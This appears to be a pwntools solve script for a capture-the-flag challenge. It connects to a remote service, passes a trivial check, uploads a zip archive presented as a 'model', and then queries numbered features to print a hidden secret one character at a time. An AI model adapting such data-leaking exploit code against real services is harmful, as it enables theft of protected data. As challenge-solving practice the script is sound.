import sys
import json
from pwn import *

conn = remote(sys.argv[1], sys.argv[2])

conn.recvuntil(b"= ?\n")
conn.sendline(b"4")

with open(sys.argv[3], 'rb') as f:
    zip_data = f.read()

conn.sendline(str(len(zip_data)).encode())

conn.recvuntil(b"Now send me the zip archive with your model\n")

conn.send(zip_data)

conn.recvuntil(b"Expecting features")

conn.recvuntil(b"]\n")

for i in range(int(sys.argv[4])):
    pld = {'cat': f'char_{i}'}
    conn.sendline(json.dumps(pld).encode())
    num = conn.recvline().decode()
    num = num.strip()
    print(num, chr(int(num)))



conn.close()